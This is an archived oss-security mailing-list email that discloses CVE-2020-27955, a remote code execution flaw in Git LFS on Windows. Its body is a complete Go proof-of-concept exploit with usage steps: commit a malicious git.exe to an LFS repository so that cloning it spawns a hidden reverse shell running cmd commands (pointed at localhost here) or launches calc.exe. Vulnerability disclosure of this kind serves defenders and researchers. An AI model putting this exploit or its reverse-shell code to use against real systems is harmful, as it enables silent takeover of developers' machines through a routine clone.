X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2090" "Wednesday" "4" "November" "2020" "23:26:40" "-0300" "Dawid Golunski" "dawid@legalhackers.com" "<CADSYzstg3moNw6mtorU6oR01hYAOL+diDSq4A1SK+AKzR8u7qg@mail.gmail.com>" "94" "[oss-security] Git LFS (git-lfs) - Remote Code Execution (RCE) exploit CVE-2020-27955 - Clone to Pwn" nil nil nil "11" "2020110502:26:40" "[oss-security] Git LFS (git-lfs) - Remote Code Execution (RCE) exploit CVE-2020-27955 - Clone to Pwn" (number mark "U       dawid@legalh Nov  4   94/2090  " thread-indent "\"[oss-security] Git LFS (git-lfs) - Remote Code Execution (RCE) exploit CVE-2020-27955 - Clone to Pwn\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Git LFS (git-lfs) - Remote Code Execution (RCE) exploit CVE-2020-27955 - Clone to Pwn" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 22135 invoked by uid 550); 5 Nov 2020 02:27:03 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22105 invoked from network); 5 Nov 2020 02:27:02 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=legalhackers-com.20150623.gappssmtp.com; s=20150623;
        h=mime-version:from:date:message-id:subject:to;
        bh=2R/oRMwK1Q1C8ooX3lzBL62p97ol7euL5S8n1mHPvy0=;
        b=grrnPYTIRrp60LCR7JC42IeuN6yx7wN+cfEmq3wVPrm4yzUNnRyEwmxE2WrIJmcRmf
         eoQxjzhz9XaDrUaczMqavPVqKQEENi0RjtX40kBOuCHXr7O6no3NWwKRUEFBMJrt+cmY
         1dfOA8LOwO379teDxk/fR6OYk+mvTbQdfvlX5/iDPm1b/49lxO5fSkKGqd5qOa6Bp3jq
         fLnJAEi8fb/mMao1mkO3Jhx48XJe5ri+4EgVOih0vMDuE3Scf4oBVhxNKTFpUaxUlbaG
         v4DpVWDni1Fat8NqgNV9KOWa3ABjqKsuQvW1VENrRaqIusJ8YwEucwcg9NX5tS8r1gWN
         yqYQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=2R/oRMwK1Q1C8ooX3lzBL62p97ol7euL5S8n1mHPvy0=;
        b=jLufUcovPXhdzXLQU6Tp4Vp/0GocjcmPHsUv7j/RSu3/zW4sqvKEV6E2KJJKRI3nLE
         zwFpgQhYf8bdAdwc9kdLN57W2VJ0VeVo8vgwytHn5/2ZDx0FZiYdq2PJj+L35H4seBXM
         Yur63AtNtXqRahcgynjVYJZIA2u6sCz2nRj4hkwfE38sq01Mgni5bhnoj6UXZW/TWEef
         RPCwI+g6hrEqh2FkOJ9u6CcprcdtiwI1Q2lSOpNfLvOd+Z1kERimo0Ap1OLxdf+AKJKK
         WHsMwHe1Bq9n3kmHxRdtXGomlhp/ZnwnOfODOywO4sfUA5P4kB3+ZWvB3ZvwBPDrqHsl
         73DQ==
X-Gm-Message-State: AOAM531z5uSK5HSSthd89F1jq/7f6cWV0qCKKeJdeCGiRVGyLWV+kTmn
	wHsEu3gjlVwW+UewkBZOfrUs5L4f3WN9MsgHMHX3QnS6001194Jy43s=
X-Google-Smtp-Source: ABdhPJx/iScXb8o5jY0mt+HBaldjA6/POjOjcJUDI27ItcZgsqiyQI/JoHIjJqRQj0tiQ3vGRrOMHlhjEzdW+tq7MkU=
X-Received: by 2002:a17:906:a996:: with SMTP id jr22mr131324ejb.463.1604543210991;
 Wed, 04 Nov 2020 18:26:50 -0800 (PST)
MIME-Version: 1.0
From: Dawid Golunski <dawid@legalhackers.com>
Date: Wed, 4 Nov 2020 23:26:40 -0300
Message-ID: <CADSYzstg3moNw6mtorU6oR01hYAOL+diDSq4A1SK+AKzR8u7qg@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset="UTF-8"
Subject: [oss-security] Git LFS (git-lfs) - Remote Code Execution (RCE) exploit
 CVE-2020-27955 - Clone to Pwn

/*
   Go PoC exploit for git-lfs -  Remote Code Execution (RCE)
vulnerability CVE-2020-27955
   git-lfs-RCE-exploit-CVE-2020-27955.go

   Discovered by Dawid Golunski
   https://legalhackers.com
   https://exploitbox.io


   Affected (RCE exploit):
   Git / GitHub CLI / GitHub Desktop / Visual Studio / GitKraken /
SmartGit / SourceTree etc.
   Basically the whole Windows dev world which uses git.

   Usage:
   Compile: go build git-lfs-RCE-exploit-CVE-2020-27955.go
   Save & commit as git.exe

   The payload should get executed automatically on git clone operation.
   It spawns a reverse shell, or a calc.exe for testing (if it
couldn't connect).

   An lfs-enabled repository with lfs files may also be needed so that git-lfs
gets invoked. This can be achieved with:

   git lfs track "*.dat"
   echo "fat bug file" > lfsdata.dat
   git add .*
   git add *
   git commmit -m 'git-lfs exploit' -a

   Check out the full advisory for details:

   https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html
   https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html

   PoC video at:
   https://youtu.be/tlptOf9w274

 ** For testing purposes only **


*/

package main
import (
    "net"
    "os/exec"
    "bufio"
    "syscall"
)


func revsh(host string) {

    c, err := net.Dial("tcp", host)
    if nil != err {
    // Conn failed
        if nil != c {
            c.Close()
        }
        // Calc for testing purposes if no listener available
        cmd := exec.Command("calc")
        cmd.Run()
        return
    }

    r := bufio.NewReader(c)
    for {
        runcmd, err := r.ReadString('\n')
        if nil != err {
            c.Close()
            return
        }
        cmd := exec.Command("cmd", "/C", runcmd)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        out, _ := cmd.CombinedOutput()
        c.Write(out)
    }
}

// Connect to netcat listener on local port 1337
func main() {
    revsh("localhost:1337")
}


-- 
Regards,
Dawid Golunski
https://legalhackers.com
https://ExploitBox.io
t: @dawid_golunski
